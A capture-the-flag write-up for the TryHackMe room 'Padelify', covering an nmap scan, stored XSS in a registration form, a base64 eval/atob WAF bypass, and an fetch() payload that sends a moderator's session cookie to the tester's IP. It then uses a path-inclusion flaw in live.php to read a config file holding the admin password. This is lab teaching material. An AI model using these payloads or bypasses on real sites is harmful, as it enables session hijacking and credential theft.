---
title: "TryHackMe: Padelify"
author: jaxafed
categories: [TryHackMe]
tags: [linux, web, php, xss, stored xss, javascript, waf, waf bypass, fuzzing, file disclosure, lfi]
render_with_liquid: false
media_subpath: /images/tryhackme_padelify/
image:
  path: room_image.webp
---

**Padelify** started by exploiting a **Cross-Site Scripting (XSS)** vulnerability and bypassing the **WAF** to capture a **moderator** user's cookies, which we then used to log in to the application and obtain the first flag.

Afterward, by fuzzing the web application, we were able to discover the location of its configuration file. Exploiting a **file disclosure** vulnerability to read it, we obtained the **admin** password and using it we logged in as the admin user, retrieved the second flag, and completed the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/padelify){: .center }

## Initial Enumeration

### Nmap Scan

As usual, we start with an **nmap** scan:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.201.91.123
Nmap scan report for 10.201.91.123
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7b:93:d3:67:e1:b5:a5:c7:cc:1d:d3:45:5a:71:5b:f4 (ECDSA)
|_  256 bf:24:d4:b1:c1:27:ef:a3:7d:7d:39:92:da:6a:36:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Padelify - Tournament Registration
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

* **22** (`SSH`)
* **80** (`HTTP`)

### Web 80

Looking at port **80**, we get a registration form with the message **"Sign up and a moderator will approve your participation."**.

![Web 80 Index](web_80_index.webp){: width="2500" height="1250"}

Clicking the **Login** button in the header redirects us to `/login.php`, where we see a login form.

![Web 80 Login](web_80_login.webp){: width="2500" height="1250"}

## Access as Moderator

### Discovering XSS

Since our registration request seems to be reviewed by a moderator, we can try a simple XSS payload as the username, such as:

```xml
<img src=http://10.6.27.248/test.png />
```

![Web 80 Register Xss](web_80_register_xss.webp){: width="2500" height="1250"}

Checking our web server, we can see that this works, as we receive hits for `test.png`.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.201.91.123 - - [21/Nov/2025 21:57:27] code 404, message File not found
10.201.91.123 - - [21/Nov/2025 21:57:27] "GET /test.png HTTP/1.1" 404 -
```

### Bypassing WAF

From the **nmap** scan we know that the `httponly` flag for the `PHPSESSID` cookie is not set. So we can try to steal the moderator's cookies with a payload such as:

```xml
<img src=x onerror=fetch("http://10.6.27.248/?c="+document.cookie) />
```

![Web 80 Register Xss Two](web_80_register_xss2.webp){: width="2500" height="1250"}

However, this payload gets blocked by the WAF.

![Web 80 Register Waf](web_80_register_waf.webp){: width="2500" height="1250"}

After some testing, we can determine that the `img` tag with the `onerror` attribute seems to be flagged by the WAF. Instead, we can try the `body` tag with the `onload` attribute, which doesn't seem to be blocked:


```xml
<body onload=fetch("http://10.6.27.248/?c="+document.cookie) />
```

However, when combining it with our cookie-stealing logic, it gets blocked again.

![Web 80 Register Xss Three](web_80_register_xss3.webp){: width="2000" height="1000"}


This time the problem seems to be the payload itself. Since neither `eval` nor `atob` is blocked, we can try passing our cookie-stealing payload **base64-encoded** to bypass the WAF.

First, convert the payload to base64:

```console
$ echo -n 'fetch("http://10.6.27.248/?c="+document.cookie)' | base64 -w0
ZmV0Y2goImh0dHA6Ly8xMC42LjI3LjI0OC8/Yz0iK2RvY3VtZW50LmNvb2tpZSk=
```

Now modify the XSS payload:

```xml
<body onload=eval(atob("ZmV0Y2goImh0dHA6Ly8xMC42LjI3LjI0OC8/Yz0iK2RvY3VtZW50LmNvb2tpZSk=")) />
```

Submitting this as our username, it seems we successfully bypass the WAF.

![Web 80 Register Xss Four](web_80_register_xss4.webp){: width="2000" height="1000"}

Checking our web server, we see that our payload worked and we captured the moderator's cookie:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.201.91.123 - - [21/Nov/2025 22:07:56] "GET /?c=PHPSESSID=37a91jfco68cedac15u1s36v3v HTTP/1.1" 200 -
```

Replacing our `PHPSESSID` cookie with the captured one:

![Web 80 Cookie](web_80_cookie.webp){: width="2500" height="1250"}

Refreshing the page, we can see that we are logged in as the moderator and the flag is displayed on the dashboard.

![Web 80 Moderator](web_80_moderator.webp){: width="2500" height="1250"}

## Access as Admin

### Discovering the Configuration

As a moderator, there does not seem to be any additional functionality available apart from accepting or rejecting registrations.

So instead, we try fuzzing the web application, which reveals the `/logs/` endpoint:

```console
$ ffuf -u 'http://10.201.91.123/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -e .php,/ -ic -t 100 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -fc 404
...
logs/                   [Status: 200, Size: 937, Words: 64, Lines: 17, Duration: 198ms]
...
```
{: .wrap }

Visiting `/logs/`, we can see that directory indexing is enabled and one file is present: `error.log`.

![Web 80 Logs](web_80_logs.webp){: width="2500" height="1250"}

Opening `/logs/error.log`, we see something interesting: the location of the web server configuration is revealed as **`/var/www/html/config/app.conf`**.

![Web 80 Error Log](web_80_error_log.webp){: width="2500" height="1250"}

Trying to access `/config/app.conf` directly, we see the request is blocked by the WAF.

![Web 80 Config Waf](web_80_config_waf.webp){: width="2500" height="1250"}

### File Disclosure

It seems we won't be able to access the config directly. However, by checking the **"Live"** button in the header, we get redirected to an interesting endpoint: `/live.php?page=match.php`

![Web 80 Live](web_80_live.webp){: width="2500" height="1250"}

Testing the `page` parameter with `/live.php?page=footer.php`, we can confirm we are able to include other files.

![Web 80 Live Footer](web_80_live_footer.webp){: width="2500" height="1250"}

Knowing this, we can try including the config file with `/live.php?page=config/app.conf`, but the WAF blocks it again.

![Web 80 Live Waf](web_80_live_waf.webp){: width="2500" height="1250"}

Trying to bypass the WAF by URL-encoding the `config/app.conf` value we passed, we can see that this works, as we get the configuration, which includes the password `b[REDACTED]4` in the `admin_info` key.

![Web 80 Live Config](web_80_live_config.webp){: width="2000" height="1000"}

Now logging in to the application as the admin user with the discovered `admin:b[REDACTED]4` credentials, we are able to access the admin dashboard, where the second flag is displayed and we can complete the room.

![Web 80 Admin](web_80_admin.webp){: width="2000" height="1000"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
